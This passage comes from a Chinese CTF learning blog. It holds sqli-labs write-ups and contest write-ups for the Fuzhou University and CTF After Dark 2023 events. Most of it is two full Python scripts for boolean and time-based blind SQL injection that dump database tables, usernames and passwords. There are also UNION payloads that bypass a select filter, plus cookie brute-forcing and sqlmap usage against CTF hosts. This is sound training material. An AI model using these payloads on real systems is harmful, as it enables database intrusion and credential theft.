class="string">&quot;?id=1&#x27; and length((select concat(username,0x3a,password)from users limit &#123;&#125;,1))=&#123;&#125;--+&quot;</span>.<span class="built_in">format</span>(i,</span><br><span class="line">                                                                                                                     length)</span><br><span class="line">            html_content = requests.get(target_url + payload).text</span><br><span class="line">            result = re.findall(<span class="string">&quot;You are in...........&quot;</span>, html_content)</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                table_name_length.append(length)</span><br><span class="line">                <span class="comment"># print(table_name_length)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> table_name_length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>(<span class="params">target_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    爆表和列原理一样,爆出表后改一下payload爆列</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    letters = string.ascii_lowercase + string.digits + <span class="string">&#x27;_:@-!&#x27;</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    table_length = get_table_name_length(target_url)</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(table_length)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, table_length[length] + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">                payload = <span class="string">&quot;?id=1&#x27; and substring((select concat(username,0x3a,password)from users limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span> \</span><br><span class="line">                    .<span class="built_in">format</span>(length, i, letter)</span><br><span class="line">                html_content = requests.get(target_url + payload).text</span><br><span class="line">                result = re.findall(<span class="string">&quot;You are in...........&quot;</span>, html_content)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    table_name += letter</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The injected data are &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_name))</span><br><span class="line">        table_name += <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_database_name(<span class="string">&quot;http://127.0.0.1/Less-8/&quot;</span>)</span><br><span class="line">    get_table_name(<span class="string">&quot;http://127.0.0.1/Less-8/&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>好东西，抄了</p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>时间盲注，乐<br>sleep()</p>
<p>找了个代码，优点是好改，缺点是太慢了。。真的太慢了。。我吃了个雪糕回来还没跑完</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/9/7 10:20</span></span><br><span class="line"><span class="comment"># @Author  : AA8j</span></span><br><span class="line"><span class="comment"># @Site    : </span></span><br><span class="line"><span class="comment"># @File    : Time-based-blind-SQL-injection.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : https://blog.csdn.net/qq_44874645</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">url, payload_header, payload_end</span>):</span><br><span class="line">    <span class="comment"># 获取长度</span></span><br><span class="line">    length = <span class="number">100</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        payload = url + payload_header + \</span><br><span class="line">                  <span class="string">&quot;length((select group_concat(table_name) from information_schema.tables &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;where table_schema=database()))=<span class="subst">&#123;L&#125;</span>&quot;</span> + payload_end</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在获取当前库所有表名拼接后长度：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> judge_time(payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n当前库所有表名拼接后长度：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            length = L</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> L == <span class="number">999</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r无法获取当前库所有表名拼接后长度为：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取值</span></span><br><span class="line">    tables_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在获取第<span class="subst">&#123;i&#125;</span>个值：<span class="subst">&#123;tables_name&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> ascii_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>, <span class="number">123</span>):</span><br><span class="line">            payload = url + payload_header + \</span><br><span class="line">                      <span class="string">f&quot;(select ascii(mid(group_concat(table_name),<span class="subst">&#123;i&#125;</span>,1)) from information_schema.tables &quot;</span> \</span><br><span class="line">                      <span class="string">f&quot;where table_schema=database())=<span class="subst">&#123;ascii_num&#125;</span>&quot;</span> + payload_end</span><br><span class="line">            <span class="keyword">if</span> judge_time(payload):</span><br><span class="line">                tables_name += <span class="built_in">chr</span>(ascii_num)</span><br><span class="line">    tables_list = tables_name.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\n获取所有表名结束：&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> tables_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_columns</span>(<span class="params">table_name, url, payload_header, payload_end</span>):</span><br><span class="line">    <span class="comment"># 获取长度</span></span><br><span class="line">    length = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        payload = url + payload_header + \</span><br><span class="line">                  <span class="string">f&quot;length((select group_concat(column_name) from information_schema.columns &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;where table_schema=DATABASE() AND &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;&quot;&quot;table_name=0x<span class="subst">&#123;<span class="built_in">str</span>(binascii.b2a_hex(table_name.encode(<span class="string">r&quot;utf-8&quot;</span>))).split(<span class="string">&quot;&#x27;&quot;</span>)[<span class="number">1</span>]&#125;</span>))=<span class="subst">&#123;L&#125;</span>&quot;&quot;&quot;</span> \</span><br><span class="line">                  + payload_end</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在获取<span class="subst">&#123;table_name&#125;</span>表所有字段名拼接后长度：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> judge_time(payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;table_name&#125;</span>表所有字段名拼接后长度为：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            length = L</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> L == <span class="number">999</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r无法获取当<span class="subst">&#123;table_name&#125;</span>表所有字段名拼接后长度：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取值</span></span><br><span class="line">    columns_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在获取第<span class="subst">&#123;i&#125;</span>个值：<span class="subst">&#123;columns_name&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> ascii_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>, <span class="number">123</span>):</span><br><span class="line">            payload = url + payload_header + \</span><br><span class="line">                      <span class="string">f&quot;(select ascii(mid(group_concat(column_name),<span class="subst">&#123;i&#125;</span>,1)) from information_schema.columns &quot;</span> \</span><br><span class="line">                      <span class="string">f&quot;where table_schema=DATABASE() AND table_name=&quot;</span> \</span><br><span class="line">                      <span class="string">f&quot;&quot;&quot;0x<span class="subst">&#123;<span class="built_in">str</span>(binascii.b2a_hex(table_name.encode(<span class="string">r&quot;utf-8&quot;</span>))).split(<span class="string">&quot;&#x27;&quot;</span>)[<span class="number">1</span>]&#125;</span>)=<span class="subst">&#123;ascii_num&#125;</span>&quot;&quot;&quot;</span> \</span><br><span class="line">                      + payload_end</span><br><span class="line">            <span class="keyword">if</span> judge_time(payload):</span><br><span class="line">                columns_name += <span class="built_in">chr</span>(ascii_num)</span><br><span class="line">    columns_list = columns_name.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\n获取<span class="subst">&#123;table_name&#125;</span>表的所有字段名结束：&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> columns_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">chose_table, column_list, url, payload_header, payload_end</span>):</span><br><span class="line">    <span class="comment"># 获取记录</span></span><br><span class="line">    columns_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> column_list:</span><br><span class="line">        columns_name += <span class="string">f&quot;,<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取长度</span></span><br><span class="line">    length = <span class="number">10000</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        payload = url + payload_header + \</span><br><span class="line">                  <span class="string">f&quot;length((select group_concat(concat_ws(&#x27;:&#x27;<span class="subst">&#123;columns_name&#125;</span>)) from <span class="subst">&#123;chose_table&#125;</span>))=<span class="subst">&#123;L&#125;</span>&quot;</span><span class="string">&quot;&quot;</span> \</span><br><span class="line">                  + payload_end</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在获取<span class="subst">&#123;chose_table&#125;</span>表所有记录拼接后长度：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> judge_time(payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;chose_table&#125;</span>表所有记录拼接后长度为：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            length = L</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> L == <span class="number">9999</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\r无法获取当<span class="subst">&#123;chose_table&#125;</span>表所有记录拼接后长度：<span class="subst">&#123;L&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    data = []</span><br><span class="line">    data_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 获取值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\r正在获取第<span class="subst">&#123;i&#125;</span>个值：<span class="subst">&#123;data_str&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> ascii_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>, <span class="number">123</span>):</span><br><span class="line">            payload = url + payload_header + \</span><br><span class="line">                      <span class="string">f&quot;(select ascii(mid(group_concat(concat_ws(&#x27;:&#x27;<span class="subst">&#123;columns_name&#125;</span>)),<span class="subst">&#123;i&#125;</span>,1)) from <span class="subst">&#123;chose_table&#125;</span>)&quot;</span> \</span><br><span class="line">                      <span class="string">f&quot;=<span class="subst">&#123;ascii_num&#125;</span> &quot;</span> + payload_end</span><br><span class="line">            <span class="keyword">if</span> judge_time(payload):</span><br><span class="line">                data_str += <span class="built_in">chr</span>(ascii_num)</span><br><span class="line"></span><br><span class="line">    data_list = data_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data_list:</span><br><span class="line">        data.append(i.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\n获取<span class="subst">&#123;chose_table&#125;</span>表的所有记录结束：&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_time</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment"># 判断响应时间</span></span><br><span class="line">    time = html_get_time(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">3</span> &lt;= time &lt; <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html_get_time</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 返回响应时间</span></span><br><span class="line">    req = requests.session()</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: ua.random&#125;</span><br><span class="line">    timeout = <span class="number">6</span></span><br><span class="line">    response = req.get(url, headers=headers, timeout=timeout)</span><br><span class="line">    <span class="keyword">return</span> response.elapsed.seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/Less-9/?id=1&#x27;</span></span><br><span class="line">    payload_header = <span class="string">&quot;&#x27; and if(&quot;</span></span><br><span class="line">    payload_end = <span class="string">&quot;,sleep(3),1)--+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;========Time-based-blind-SQL-injection==============&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=====================By:AA8j========================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;目标：&#x27;</span> + url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ------------------------获取表-------------------------------</span></span><br><span class="line">    tables_list = get_tables(url, payload_header, payload_end)</span><br><span class="line">    <span class="comment"># tables_list = [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tables_list)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>.<span class="subst">&#123;tables_list[i]&#125;</span>&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    chose_table = tables_list[<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;\n请选择要获取字段的表名：&#x27;</span>)) - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ------------------------获取字段-----------------------------</span></span><br><span class="line">    columns_list = get_columns(chose_table, url, payload_header, payload_end)</span><br><span class="line">    <span class="comment"># columns_list = [&#x27;id&#x27;, &#x27;username&#x27;, &#x27;password&#x27;]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(columns_list)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>.<span class="subst">&#123;columns_list[i]&#125;</span>&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ------------------------获取记录-----------------------------</span></span><br><span class="line">    data = get_data(chose_table, columns_list, url, payload_header, payload_end)</span><br><span class="line">    <span class="comment"># data = [[&#x27;1&#x27;, &#x27;Dumb&#x27;, &#x27;Dumb&#x27;], [&#x27;2&#x27;, &#x27;Angelina&#x27;, &#x27;I-kill-you&#x27;], [&#x27;3&#x27;, &#x27;Dummy&#x27;, &#x27;p@ssword&#x27;]]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> columns_list:</span><br><span class="line">        <span class="built_in">print</span>(i.ljust(<span class="number">20</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;-&#x27;</span> * <span class="built_in">len</span>(columns_list) * <span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">print</span>(j.ljust(<span class="number">20</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;-&#x27;</span> * <span class="built_in">len</span>(columns_list) * <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>双引号，其余同上</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>福州大学信息安全竞赛部分wp</title>
    <url>/2023/05/13/%E7%A6%8F%E5%B7%9E%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>福州大学信息安全竞赛部分wp(全 是 简 单 题)</p>
<span id="more"></span>
<h1 id="OhMyChess"><a href="#OhMyChess" class="headerlink" title="OhMyChess"></a>OhMyChess</h1><p>不知道预期解法，发现只要对王，输了之后也会有flag出来。</p>
<h1 id="flag-in-text"><a href="#flag-in-text" class="headerlink" title="flag_in_text"></a>flag_in_text</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义字符串</span></span><br><span class="line">s = <span class="string">&quot;Toc&#123;CnCTeCTFf&#123;mF&#123;oFC0?tCnutTtFffyfiT0&#123;C&#123;mi0it00ifFeftcfcCto&#123;o&#123;nnnCTf&#125;nui0Cm?FmCn&#123;FmCT?&#123;yfn?if0fiifumfunfT6!cCeCyTycmmFTo???e&#123;m!ion&#123;tCitT!&#123;nc&#123;Foi?C&#123;f!e?iTt?&#125;Ce0iyem&#123;CTui?CtyCF&#123;?Fyfn&#123;m0!eoCFi?&#123;in&#125;niFfoc?F?0to&#123;?iT?!n&#123;cCfttFmy&#123;F0CTCielT&#125;fTnnmCfncCeyF?&#123;mneFm&#123;TemnT&#123;ufT&#123;fFTf&#125;iF0coCn&#123;&#123;0?ycu?o&#123;f?FcC?0uymoFmT0&#125;0e&#123;tTeof&#123;e!oFctCennTym&#125;F?0oeciCo&#125;omni&#123;if!cd&#125;gieFufTmFneCct&#123;TneCCyfFCyct?f&#123;CTmcn&#123;&#123;FCuCCmFfcToC&#123;u0TFcC?myCfnF0t&#123;ifF?cTc0&#123;&#125;FFfT&#123;mF!?FmoFCFyuToc5icoenn!uT?FoeTT&#123;n&#123;ify?ffniF&#123;fTei?0tT0fqui?u2min!?kFFCtnttnie&#123;?CfCF0rieuTiTT&#123;Cntfeocfotm0mT?efeu0F?Te?&#125;&#123;nn?cFF?ycucinuFCfuTTo&#123;CTCyfF03i!Fcitf&#123;&#123;nutt?mT?Tye&#123;Ct&#123;icmFFTC?tTn&#125;Cc0ic&#123;n?ntyffif?eFmniiFtCTm?tT?T&#123;nyeoicT!ytFTiF0!ye??yffnFn&#123;fTTttTTnfenoyFfTuCoiFcoF?cTTc?ucc&#123;yT?&#123;n?eCFyceC?c!mTmT?fConyyotC?eCiCFni&#123;cccaiFCFC!F0ucitFetCcfccy&#123;FjeTf&#123;TCFyCp?FieFTefnFtf0?yT!eo0nCic!&#123;if?F9&#125;FCoomehiffcc?&#123;&#123;&#123;tF?CmuFo!&#125;feeyFiT&#123;n?iyFiuTi0u&#123;&#123;C&#123;CCTcFoccF?0fmf?wufoiytfn!iiCTmc?f?oen?mFCtcTF&#123;z0fu?CFc!&#123;e&#125;CfeeTnitv&#125;ft0nFT?Ft1imn!Cn&#125;mcT?ocnoc?FuCc7nfF&#123;T?ofnxCi&#123;f&#123;CCteTmoFoCF?e?FTC?C!&#125;fiyte&#123;nF?&#123;FenCFct!08ytfufC&#123;&#123;0FeefsiiTotin&#125;CnynCnui0ofCfct?tfCyCFbofcCfuifC?fio!tt?&#123;&#123;&#123;Fi&#123;TCe0cfneT&#123;cmef4FTomTenuttTFCyTCCTenFonoTnT&#125;uF?TFFu?enm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建字典</span></span><br><span class="line">freq = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字符串，计算字符频次</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> char <span class="keyword">in</span> freq:</span><br><span class="line">        freq[char] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        freq[char] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">sorted</span>(freq.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> char, count <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(char, count)</span><br></pre></td></tr></table></figure>

<h1 id="OhMySubstitution"><a href="#OhMySubstitution" class="headerlink" title="OhMySubstitution"></a>OhMySubstitution</h1><p>对照<code>task.py</code>和<code>task.py.sub</code>，推出<code>flag.txt.sub</code>代表的flag值</p>
<h1 id="自-信-音-游-人"><a href="#自-信-音-游-人" class="headerlink" title="自 信 音 游 人"></a>自 信 音 游 人</h1><p>网易云识曲得知这首歌叫<code>だいあるのーと</code>，找个原曲下下来，将原曲和题目给的曲子导入Audacity。<br>反相原曲将两首歌混响后可以得到拨号数字音，学习DMTF相关知识后通过看谱频图得到数字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00082 00079 00073 00083 00123 00110 00049 00099 00051 00095 00116 00048 00110 00051 00115 00125</span><br></pre></td></tr></table></figure>
<p>转化ASCII得到flag。<br><del>偷懒用dtmf2num工具结果解不出来我真的会闹（悲）</del></p>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-After-Dark-Winter-2023部分wp</title>
    <url>/2023/03/02/CTF-After-Dark-Winter-2023%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>CTF After Dark Winter 2023的部分wp</p>
<span id="more"></span>
<p>感谢友善帮助我的syy和potato🙏</p>
<h2 id="Bagels"><a href="#Bagels" class="headerlink" title="Bagels"></a>Bagels</h2><p>右键查看源代码，<code>script.js</code>文件里<br>直接查看网页cookie也可以</p>
<h2 id="Birthday"><a href="#Birthday" class="headerlink" title="Birthday"></a>Birthday</h2><p>右键查看源代码</p>
<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>由题意得，机器小猫，在url末端加上<code>robots.txt</code>可以看到<code>Disallow: /cat/vet.html</code>，把url末端改成这个。</p>
<h2 id="Mean-Girls"><a href="#Mean-Girls" class="headerlink" title="Mean Girls"></a>Mean Girls</h2><p>右键查看源代码，在<code>login-page.js</code>文件里可以看到</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (username === <span class="string">&quot;admin&quot;</span> &amp;&amp; password === <span class="string">&quot;cybersecure&quot;</span>) &#123;</span><br><span class="line">       <span class="title function_">alert</span>(<span class="string">&quot;You have successfully logged in.&quot;</span>);</span><br><span class="line">       location.<span class="property">href</span> = <span class="string">&#x27;flag.html&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>在login页面输入username和password（直接在url末端加<code>/flag.html</code>应该也可以</p>
<p>在flag.html页面可以找到<code>iodj&#123;rq_z3gq3vg4bv_z3_zh4u_s1qn&#125;</code><br>结合名字<code>caesar</code>可知是凯撒密码，位移是3</p>
<h2 id="Star-Poet-Blog"><a href="#Star-Poet-Blog" class="headerlink" title="Star Poet Blog"></a>Star Poet Blog</h2><p>题中诗的url末端都是<code>/achieve/xxx.txt</code>结合题干，在<code>/achieve/</code>后面加<code>password.txt</code><br>得到<code>flag&#123;1377_2127_3343_4241_5864&#125;</code><br>结合poetry 101: what’s a poem?这个链接，得知第一个数字代表第几首诗，第二个数字代表第几段，第三个数字代表第几行，第四个数字代表第几个单词，解出flag</p>
<h2 id="Secure-Platform"><a href="#Secure-Platform" class="headerlink" title="Secure Platform"></a>Secure Platform</h2><p>点击<code>Get your flag!</code>按键，页面提示<code>Your platform is &quot;Windows&quot;, I&#39;d much rather it be &quot;INTEGRITY-178B&quot;.</code>，用bp抓包改一下<code>Sec-Ch-Ua-Platform</code>部分</p>
<h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>过滤了select，好吧我连堆叠注入都在尝试了，然后善良的syy告诉我，直接双写绕过就好了（我是若汁啊啊啊啊啊啊啊啊</p>
<ol>
<li><p><code>username=&#39; order by 3 #&amp;password=1</code>没报错<br><code>username=&#39; order by 4 #&amp;password=1</code>报错<br>说明表是三列的</p>
</li>
<li><p><code>username=&#39; union selselectect 1,2,3#&amp;password=1</code></p>
</li>
<li><p>查库名<code>username=&#39; union selselectect 1,2,schema_name from information_schema.schemata#&amp;password=1</code><br>库名为bankdb</p>
</li>
<li><p>查表名<code>username=&#39; union selselectect 1,2,table_name from information_schema.tables where table_schema=&#39;bankdb&#39;#&amp;password=1</code><br>表名为flags和users</p>
</li>
<li><p>查列名<code>username=&#39; union selselectect 1,2,column_name from information_schema.columns where table_name=&#39;flags&#39;#&amp;password=1</code><br>列名为flag和value（后知后觉题目给了（悲</p>
</li>
<li><p>查字段<code>username=&#39; union selselectect 1,2,concat_ws(&#39;:&#39;,flag,value) from bankdb.flags#&amp;password=1</code></p>
</li>
</ol>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>这道题摸不着头脑半天，善良的potato说题目意思应该是cookie随机一个1000以内的值，如果随机到它想要的就可以得到flag。。。<br>bp爆破一下cookie请求头就可以叻<br>（btw如果足够幸运是不是有概率一下子随机到正确的cookie值。。</p>
<h2 id="Injection-Perfection"><a href="#Injection-Perfection" class="headerlink" title="Injection Perfection"></a>Injection Perfection</h2><p>这道题看起来是node.js写的，源码也看不明白，题也不会做。。大概过滤了井号大于小于等于这样。。。？</p>
<p>但是。。。没关系。。。sqlmap堂堂出场。。。。<br>（是的本人是一个只会借助工具的没用的东西（悲</p>
<ol>
<li><p>首先。。<br><code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot;</code><br>出来一堆乱糟糟的。。看也看不懂。。。。。</p>
</li>
